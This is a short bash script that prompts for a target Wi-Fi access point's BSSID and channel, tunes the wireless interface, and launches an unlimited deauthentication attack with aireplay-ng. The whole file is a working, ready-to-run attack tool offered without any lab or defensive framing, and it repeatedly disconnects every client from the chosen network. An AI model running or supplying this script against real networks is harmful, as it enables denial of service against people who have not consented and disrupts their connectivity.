#!/bin/bash

echo "PASTE YOUR TARGET BSSID: "
read BSSID

echo "ENTER THE TARGET CHANNEL: "
read CHANNEL

# Check if aireplay-ng is installed
if ! command -v aireplay-ng &> /dev/null
then
    echo "Error: aireplay-ng is not installed. Please install aircrack-ng package."
    exit 1
fi

# Set the wireless card to monitor mode on correct channel
sudo iwconfig wlp3s0mon channel "$CHANNEL"

echo "Starting Deauth Attack on BSSID $BSSID at Channel $CHANNEL"

# Run infinite deauth
sudo aireplay-ng --deauth 0 -a "$BSSID" wlp3s0mon
